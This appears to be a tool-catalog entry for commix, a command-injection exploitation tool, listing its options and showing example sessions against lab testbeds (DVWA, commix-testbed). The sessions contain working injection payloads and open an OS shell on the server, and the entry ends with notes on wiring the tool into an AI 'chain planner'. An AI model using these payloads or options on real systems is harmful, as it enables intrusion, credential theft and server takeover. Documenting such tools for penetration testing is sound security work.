name: commix
title: commix

commands.name: commix

arguments.description: Show help and exit.
arguments.raw: -h, --help            Show help and exit.

arguments.description: Verbosity level (0-4, Default: 0).
arguments.raw: -v VERBOSE          Verbosity level (0-4, Default: 0).

arguments.description: Show version number and exit.
arguments.raw: --version           Show version number and exit.

arguments.description: Set custom output directory path.
arguments.raw: --output-dir=OUT..  Set custom output directory path.

arguments.description: Load session from a stored (.sqlite) file.
arguments.raw: -s SESSION_FILE     Load session from a stored (.sqlite) file.

arguments.description: Flush session files for current target.
arguments.raw: --flush-session     Flush session files for current target.

arguments.description: Ignore results stored in session file.
arguments.raw: --ignore-session    Ignore results stored in session file.

arguments.description: Log all HTTP traffic into a textual file.
arguments.raw: -t TRAFFIC_FILE     Log all HTTP traffic into a textual file.

arguments.description: Run with a time limit in seconds (e.g. 3600).
arguments.raw: --time-limit=TIM..  Run with a time limit in seconds (e.g. 3600).

arguments.description: Never ask for user input, use the default behaviour.
arguments.raw: --batch             Never ask for user input, use the default behaviour.

arguments.description: Skip heuristic detection for code injection.
arguments.raw: --skip-heuristics   Skip heuristic detection for code injection.

arguments.description: Force codec for character encoding (e.g. 'ascii').
arguments.raw: --codec=CODEC       Force codec for character encoding (e.g. 'ascii').

arguments.description: Time-related injection charset (e.g.
arguments.raw: --charset=CHARSET   Time-related injection charset (e.g.

arguments.description: Check internet connection before assessing the target.
arguments.raw: --check-internet    Check internet connection before assessing the target.

arguments.description: Set predefined answers (e.g. 'quit=N,follow=N').
arguments.raw: --answers=ANSWERS   Set predefined answers (e.g. 'quit=N,follow=N').

arguments.description: Target URL.
arguments.raw: -u URL, --url=URL   Target URL.

arguments.description: Reload target URL after command execution.
arguments.raw: --url-reload        Reload target URL after command execution.

arguments.description: Parse target from HTTP proxy log file.
arguments.raw: -l LOGFILE          Parse target from HTTP proxy log file.

arguments.description: Scan multiple targets given in a textual file.
arguments.raw: -m BULKFILE         Scan multiple targets given in a textual file.

arguments.description: Load HTTP request from a file.
arguments.raw: -r REQUESTFILE      Load HTTP request from a file.

arguments.description: Crawl the website starting from the target URL
arguments.raw: --crawl=CRAWLDEPTH  Crawl the website starting from the target URL

arguments.description: Regexp to exclude pages from crawling (e.g. 'logout').
arguments.raw: --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. 'logout').

arguments.description: Parse target(s) from remote sitemap(.xml) file.
arguments.raw: -x SITEMAP_URL      Parse target(s) from remote sitemap(.xml) file.

arguments.description: Force usage of given HTTP method (e.g. 'PUT').
arguments.raw: --method=METHOD     Force usage of given HTTP method (e.g. 'PUT').

arguments.description: Data string to be sent through POST.
arguments.raw: -d DATA, --data=..  Data string to be sent through POST.

arguments.description: HTTP Host header.
arguments.raw: --host=HOST         HTTP Host header.

arguments.description: HTTP Referer header.
arguments.raw: --referer=REFERER   HTTP Referer header.

arguments.description: HTTP User-Agent header.
arguments.raw: --user-agent=AGENT  HTTP User-Agent header.

arguments.description: Use a randomly selected HTTP User-Agent header.
arguments.raw: --random-agent      Use a randomly selected HTTP User-Agent header.

arguments.description: Set character for splitting parameter values.
arguments.raw: --param-del=PDEL    Set character for splitting parameter values.

arguments.description: HTTP Cookie header.
arguments.raw: --cookie=COOKIE     HTTP Cookie header.

arguments.description: Set character for splitting cookie values.
arguments.raw: --cookie-del=CDEL   Set character for splitting cookie values.

arguments.description: Force requests to use the HTTP/1.0 protocol.
arguments.raw: --http1.0           Force requests to use the HTTP/1.0 protocol.

arguments.description: Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').
arguments.raw: -H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').

arguments.description: Extra headers (e.g. 'Accept-Language: fr\nETag: 123').
arguments.raw: --headers=HEADERS   Extra headers (e.g. 'Accept-Language: fr\nETag: 123').

arguments.description: Use a proxy to connect to the target URL.
arguments.raw: --proxy=PROXY       Use a proxy to connect to the target URL.

arguments.description: Use the Tor network.
arguments.raw: --tor               Use the Tor network.

arguments.description: Set Tor proxy port (Default: 8118).
arguments.raw: --tor-port=TOR_P..  Set Tor proxy port (Default: 8118).

arguments.description: Check to see if Tor is used properly.
arguments.raw: --tor-check         Check to see if Tor is used properly.

arguments.description: Login panel URL.
arguments.raw: --auth-url=AUTH_..  Login panel URL.

arguments.description: Login parameters and data.
arguments.raw: --auth-data=AUTH..  Login parameters and data.

arguments.description: HTTP authentication type (Basic, Digest, Bearer).
arguments.raw: --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer).

arguments.description: HTTP authentication credentials (e.g. 'admin:admin').
arguments.raw: --auth-cred=AUTH..  HTTP authentication credentials (e.g. 'admin:admin').

arguments.description: Abort on (problematic) HTTP error code(s) (e.g. 401).
arguments.raw: --abort-code=ABO..  Abort on (problematic) HTTP error code(s) (e.g. 401).

arguments.description: Ignore (problematic) HTTP error code(s) (e.g. 401).
arguments.raw: --ignore-code=IG..  Ignore (problematic) HTTP error code(s) (e.g. 401).

arguments.description: Force usage of SSL/HTTPS.
arguments.raw: --force-ssl         Force usage of SSL/HTTPS.

arguments.description: Ignore system default proxy settings.
arguments.raw: --ignore-proxy      Ignore system default proxy settings.

arguments.description: Ignore redirection attempts.
arguments.raw: --ignore-redirects  Ignore redirection attempts.

arguments.description: Seconds to wait before timeout connection (Default:
arguments.raw: --timeout=TIMEOUT   Seconds to wait before timeout connection (Default:

arguments.description: Retries when the connection timeouts (Default: 3).
arguments.raw: --retries=RETRIES   Retries when the connection timeouts (Default: 3).

arguments.description: Ignore Set-Cookie header from response.
arguments.raw: --drop-set-cookie   Ignore Set-Cookie header from response.

arguments.description: Retrieve everything.
arguments.raw: --all               Retrieve everything.

arguments.description: Retrieve current user name.
arguments.raw: --current-user      Retrieve current user name.

arguments.description: Retrieve current hostname.
arguments.raw: --hostname          Retrieve current hostname.

arguments.description: Check if the current user have root privileges.
arguments.raw: --is-root           Check if the current user have root privileges.

arguments.description: Check if the current user have admin privileges.
arguments.raw: --is-admin          Check if the current user have admin privileges.

arguments.description: Retrieve system information.
arguments.raw: --sys-info          Retrieve system information.

arguments.description: Retrieve system users.
arguments.raw: --users             Retrieve system users.

arguments.description: Retrieve system users password hashes.
arguments.raw: --passwords         Retrieve system users password hashes.

arguments.description: Retrieve system users privileges.
arguments.raw: --privileges        Retrieve system users privileges.

arguments.description: Retrieve PowerShell's version number.
arguments.raw: --ps-version        Retrieve PowerShell's version number.

arguments.description: Read a file from the target host.
arguments.raw: --file-read=FILE..  Read a file from the target host.

arguments.description: Write to a file on the target host.
arguments.raw: --file-write=FIL..  Write to a file on the target host.

arguments.description: Upload a file on the target host.
arguments.raw: --file-upload=FI..  Upload a file on the target host.

arguments.description: Host's absolute filepath to write and/or upload to.
arguments.raw: --file-dest=FILE..  Host's absolute filepath to write and/or upload to.

arguments.description: The 'shellshock' injection module.
arguments.raw: --shellshock        The 'shellshock' injection module.

arguments.description: Testable parameter(s).
arguments.raw: -p TEST_PARAMETER   Testable parameter(s).

arguments.description: Skip testing for given parameter(s).
arguments.raw: --skip=SKIP_PARA..  Skip testing for given parameter(s).

arguments.description: Injection payload suffix string.
arguments.raw: --suffix=SUFFIX     Injection payload suffix string.

arguments.description: Injection payload prefix string.
arguments.raw: --prefix=PREFIX     Injection payload prefix string.

arguments.description: Specify injection technique(s) to use.
arguments.raw: --technique=TECH    Specify injection technique(s) to use.

arguments.description: Specify injection technique(s) to skip.
arguments.raw: --skip-technique..  Specify injection technique(s) to skip.

arguments.description: Set the max length of output for time-related
arguments.raw: --maxlen=MAXLEN     Set the max length of output for time-related

arguments.description: Seconds to delay between each HTTP request.
arguments.raw: --delay=DELAY       Seconds to delay between each HTTP request.

arguments.description: Seconds to delay the OS response.
arguments.raw: --time-sec=TIMESEC  Seconds to delay the OS response.

arguments.description: Set the absolute path of web server's temp directory.
arguments.raw: --tmp-path=TMP_P..  Set the absolute path of web server's temp directory.

arguments.description: Set the web server document root directory (e.g.
arguments.raw: --web-root=WEB_R..  Set the web server document root directory (e.g.

arguments.description: Use an alternative os-shell (e.g. 'Python').
arguments.raw: --alter-shell=AL..  Use an alternative os-shell (e.g. 'Python').

arguments.description: Execute a single operating system command.
arguments.raw: --os-cmd=OS_CMD     Execute a single operating system command.

arguments.description: Force back-end operating system (e.g. 'Windows' or
arguments.raw: --os=OS             Force back-end operating system (e.g. 'Windows' or

arguments.description: Use given script(s) for tampering injection data.
arguments.raw: --tamper=TAMPER     Use given script(s) for tampering injection data.

arguments.description: Set a local path where metasploit is installed.
arguments.raw: --msf-path=MSF_P..  Set a local path where metasploit is installed.

arguments.description: Level of tests to perform (1-3, Default: 1).
arguments.raw: --level=LEVEL       Level of tests to perform (1-3, Default: 1).

arguments.description: Skip the mathematic calculation during the detection
arguments.raw: --skip-calc         Skip the mathematic calculation during the detection

arguments.description: Skip testing the parameter(s) with empty value(s).
arguments.raw: --skip-empty        Skip testing the parameter(s) with empty value(s).

arguments.description: Set a number of failed injection tries, in file-based
arguments.raw: --failed-tries=F..  Set a number of failed injection tries, in file-based

arguments.description: Perform thorough tests only if positive heuristic(s).
arguments.raw: --smart             Perform thorough tests only if positive heuristic(s).

arguments.description: Ignore all required third-party library dependencies.
arguments.raw: --ignore-depende..  Ignore all required third-party library dependencies.

arguments.description: Display list of available tamper scripts.
arguments.raw: --list-tampers      Display list of available tamper scripts.

arguments.description: Run host OS command(s) when injection point is found.
arguments.raw: --alert=ALERT       Run host OS command(s) when injection point is found.

arguments.description: Disable logging to a file.
arguments.raw: --no-logging        Disable logging to a file.

arguments.description: Safely remove all content from commix data directory.
arguments.raw: --purge             Safely remove all content from commix data directory.

arguments.description: Skip heuristic detection of WAF/IPS protection.
arguments.raw: --skip-waf          Skip heuristic detection of WAF/IPS protection.

arguments.description: Imitate smartphone through HTTP User-Agent header.
arguments.raw: --mobile            Imitate smartphone through HTTP User-Agent header.

arguments.description: Work in offline mode.
arguments.raw: --offline           Work in offline mode.

arguments.description: Simple wizard interface for beginner users.
arguments.raw: --wizard            Simple wizard interface for beginner users.

arguments.description: Disable console output coloring.
arguments.raw: --disable-coloring  Disable console output coloring.

commands.raw_help:
root@kali:~# commix -h
 Usage: commix [option(s)]
 
 Options:
 -h, --help            Show help and exit.
 
 General:
   These options relate to general matters.
 
   -v VERBOSE          Verbosity level (0-4, Default: 0).
   --version           Show version number and exit.
   --output-dir=OUT..  Set custom output directory path.
   -s SESSION_FILE     Load session from a stored (.sqlite) file.
   --flush-session     Flush session files for current target.
   --ignore-session    Ignore results stored in session file.
   -t TRAFFIC_FILE     Log all HTTP traffic into a textual file.
   --time-limit=TIM..  Run with a time limit in seconds (e.g. 3600).
   --batch             Never ask for user input, use the default behaviour.
   --skip-heuristics   Skip heuristic detection for code injection.
   --codec=CODEC       Force codec for character encoding (e.g. 'ascii').
   --charset=CHARSET   Time-related injection charset (e.g.
                       '0123456789abcdef').
   --check-internet    Check internet connection before assessing the target.
   --answers=ANSWERS   Set predefined answers (e.g. 'quit=N,follow=N').
 
 Target:
   This options has to be provided, to define the target URL.
 
   -u URL, --url=URL   Target URL.
   --url-reload        Reload target URL after command execution.
   -l LOGFILE          Parse target from HTTP proxy log file.
   -m BULKFILE         Scan multiple targets given in a textual file.
   -r REQUESTFILE      Load HTTP request from a file.
   --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
                       (Default: 1).
   --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. 'logout').
   -x SITEMAP_URL      Parse target(s) from remote sitemap(.xml) file.
   --method=METHOD     Force usage of given HTTP method (e.g. 'PUT').
 
 Request:
   These options can be used to specify how to connect to the target URL.
 
   -d DATA, --data=..  Data string to be sent through POST.
   --host=HOST         HTTP Host header.
   --referer=REFERER   HTTP Referer header.
   --user-agent=AGENT  HTTP User-Agent header.
   --random-agent      Use a randomly selected HTTP User-Agent header.
   --param-del=PDEL    Set character for splitting parameter values.
   --cookie=COOKIE     HTTP Cookie header.
   --cookie-del=CDEL   Set character for splitting cookie values.
   --http1.0           Force requests to use the HTTP/1.0 protocol.
   -H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').
   --headers=HEADERS   Extra headers (e.g. 'Accept-Language: fr\nETag: 123').
   --proxy=PROXY       Use a proxy to connect to the target URL.
   --tor               Use the Tor network.
   --tor-port=TOR_P..  Set Tor proxy port (Default: 8118).
   --tor-check         Check to see if Tor is used properly.
   --auth-url=AUTH_..  Login panel URL.
   --auth-data=AUTH..  Login parameters and data.
   --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer).
   --auth-cred=AUTH..  HTTP authentication credentials (e.g. 'admin:admin').
   --abort-code=ABO..  Abort on (problematic) HTTP error code(s) (e.g. 401).
   --ignore-code=IG..  Ignore (problematic) HTTP error code(s) (e.g. 401).
   --force-ssl         Force usage of SSL/HTTPS.
   --ignore-proxy      Ignore system default proxy settings.
   --ignore-redirects  Ignore redirection attempts.
   --timeout=TIMEOUT   Seconds to wait before timeout connection (Default:
                       30).
   --retries=RETRIES   Retries when the connection timeouts (Default: 3).
   --drop-set-cookie   Ignore Set-Cookie header from response.
 
 Enumeration:
   These options can be used to enumerate the target host.
 
   --all               Retrieve everything.
   --current-user      Retrieve current user name.
   --hostname          Retrieve current hostname.
   --is-root           Check if the current user have root privileges.
   --is-admin          Check if the current user have admin privileges.
   --sys-info          Retrieve system information.
   --users             Retrieve system users.
   --passwords         Retrieve system users password hashes.
   --privileges        Retrieve system users privileges.
   --ps-version        Retrieve PowerShell's version number.
 
 File access:
   These options can be used to access files on the target host.
 
   --file-read=FILE..  Read a file from the target host.
   --file-write=FIL..  Write to a file on the target host.
   --file-upload=FI..  Upload a file on the target host.
   --file-dest=FILE..  Host's absolute filepath to write and/or upload to.
 
 Modules:
   These options can be used increase the detection and/or injection
   capabilities.
 
   --shellshock        The 'shellshock' injection module.
 
 Injection:
   These options can be used to specify which parameters to inject and to
   provide custom injection payloads.
 
   -p TEST_PARAMETER   Testable parameter(s).
   --skip=SKIP_PARA..  Skip testing for given parameter(s).
   --suffix=SUFFIX     Injection payload suffix string.
   --prefix=PREFIX     Injection payload prefix string.
   --technique=TECH    Specify injection technique(s) to use.
   --skip-technique..  Specify injection technique(s) to skip.
   --maxlen=MAXLEN     Set the max length of output for time-related
                       injection techniques (Default: 10000 chars).
   --delay=DELAY       Seconds to delay between each HTTP request.
   --time-sec=TIMESEC  Seconds to delay the OS response.
   --tmp-path=TMP_P..  Set the absolute path of web server's temp directory.
   --web-root=WEB_R..  Set the web server document root directory (e.g.
                       '/var/www').
   --alter-shell=AL..  Use an alternative os-shell (e.g. 'Python').
   --os-cmd=OS_CMD     Execute a single operating system command.
   --os=OS             Force back-end operating system (e.g. 'Windows' or
                       'Unix').
   --tamper=TAMPER     Use given script(s) for tampering injection data.
   --msf-path=MSF_P..  Set a local path where metasploit is installed.
 
 Detection:
   These options can be used to customize the detection phase.
 
   --level=LEVEL       Level of tests to perform (1-3, Default: 1).
   --skip-calc         Skip the mathematic calculation during the detection
                       phase.
   --skip-empty        Skip testing the parameter(s) with empty value(s).
   --failed-tries=F..  Set a number of failed injection tries, in file-based
                       technique.
   --smart             Perform thorough tests only if positive heuristic(s).
 
 Miscellaneous:
   --ignore-depende..  Ignore all required third-party library dependencies.
   --list-tampers      Display list of available tamper scripts.
   --alert=ALERT       Run host OS command(s) when injection point is found.
   --no-logging        Disable logging to a file.
   --purge             Safely remove all content from commix data directory.
   --skip-waf          Skip heuristic detection of WAF/IPS protection.
   --mobile            Imitate smartphone through HTTP User-Agent header.
   --offline           Work in offline mode.
   --wizard            Simple wizard interface for beginner users.
   --disable-coloring  Disable console output coloring.

examples.command:
commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/ \
>   --cookie='PHPSESSID=cj645co26lgve7ro1kc9dvt3a0; security=low' \
>   --data='ip=INJECT_HERE&Submit=Submit'
                                       __

  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ { v0.3b-nongit-20160104 }

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst)
+--

(*) Checking connection to the target URL... [ SUCCEED ]
(^) Warning: Heuristics have failed to identify server's operating system.
(?) Do you recognise the server's operating system? [(W)indows/(U)nix/(q)uit] > w
(*) Setting the (POST) 'ip' parameter for tests.
(^) Warning: Due to the relatively slow response of 'cmd.exe' there may be delays during the data extraction procedure.
(*) Testing the classic injection technique... [ SUCCEED ]
(!) The (POST) 'ip' parameter is vulnerable to Results-based Command Injection.
  (+) Type : Results-based Command Injection
  (+) Technique : Classic Injection Technique
  (+) Payload : %26 for /f "delims=" %i in ('cmd /c "set /a (49+1)"') do @set /p = AWMZVA%iAWMZVAAWMZVA <nul

(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > whoami

nt authority\iusr

commix(os_shell) >

commix --url="http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php" --level=3
                                       __
   ___    ___     ___ ___     ___ ___ /\_\   __  _
  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v1.7-stable
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ http://commixproject.com
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst)
+--

[*] Checking connection to the target URL... [ SUCCEED ]
[*] Setting the HTTP header User-Agent for tests.
[*] Testing the (results-based) classic command injection technique... [ FAILED ]
[*] Testing the (results-based) dynamic code evaluation technique... [ FAILED ]
[*] Testing the (blind) time-based command injection technique... [ FAILED ]
[*] Trying to create a file in '/var/www/html/commix-testbed/scenarios/referer/'...
[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/html/commix-testbed/scenarios/referer/'.
[?] Do you want to try the temporary directory (/tmp/) [Y/n] > Y
[*] Trying to create a file, in temporary directory (/tmp/)...
[*] Testing the (semi-blind) tempfile-based injection technique... [ FAILED ]
[!] Warning: The tested HTTP header User-Agent seems to be not injectable.
[*] Setting the HTTP header Referer for tests.
[*] Testing the (results-based) classic command injection technique... [ SUCCEED ]
[+] The HTTP header Referer seems injectable via (results-based) classic command injection technique.
    [~] Payload: ';echo KSXTLU$((18+64))$(echo KSXTLU)KSXTLU'

[?] Do you want a Pseudo-Terminal shell? [Y/n] > Y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > ?

  ---[ Available options ]---
  Type '?' to get all the available options.
  Type 'back' to move back from the current context.
  Type 'quit' (or use <Ctrl-C>) to quit commix.
  Type 'reverse_tcp' to get a reverse TCP connection.
  Type 'bind_tcp' to set a bind TCP connection.

commix(os_shell) > id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

commix(os_shell) > ls

index.html referer(blind).php referer(classic).php referer(eval).php

commix(os_shell) > quit

Options:
  -h, --help            Show help and exit.

    -u URL, --url=URL   Target URL.
    --url-reload        Reload target URL after command execution.
    -l LOGFILE          Parse target from HTTP proxy log file.
    -m BULKFILE         Scan multiple targets given in a textual file.

                        (Default: 1).

    -x SITEMAP_URL      Parse target(s) from remote sitemap(.xml) file.
    --method=METHOD     Force usage of given HTTP method (e.g. 'PUT').

  [1m[4mRequest[0m:
    These options can be used to specify how to connect to the target URL.

    -d DATA, --data=..  Data string to be sent through POST.
    --host=HOST         HTTP Host header.
    --referer=REFERER   HTTP Referer header.
    --user-agent=AGENT  HTTP User-Agent header.
    --random-agent      Use a randomly selected HTTP User-Agent header.
    --param-del=PDEL    Set character for splitting parameter values.
    --cookie=COOKIE     HTTP Cookie header.
    --cookie-del=CDEL   Set character for splitting cookie values.
    --http1.0           Force requests to use the HTTP/1.0 protocol.
    -H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').
    --headers=HEADERS   Extra headers (e.g. 'Accept-Language: fr\nETag: 123').

binary_metadata.file_type: a sh script, ASCII text executable

apt_metadata.description:
Automated All-in-One OS Command Injection and Exploitation Tool
This package contains Commix (short for [comm]and [i]njection e[x]ploiter).
It has a simple environment and it can be used, from web developers,
penetration testers or even security researchers to test web applications with
the view to find bugs, errors or vulnerabilities related to command injection
attacks. By using this tool, it is very easy to find and exploit a command
injection vulnerability in a certain vulnerable parameter or string.
Commix is written in Python programming language.

use_cases: Use as a candidate tool in the chain planner; review provenance before use.
Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.
Use as a candidate tool in the chain planner; review provenance before use.
Use as a candidate tool in the chain planner; review provenance before use.
Use as a candidate tool in the chain planner; review provenance before use.
Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool.
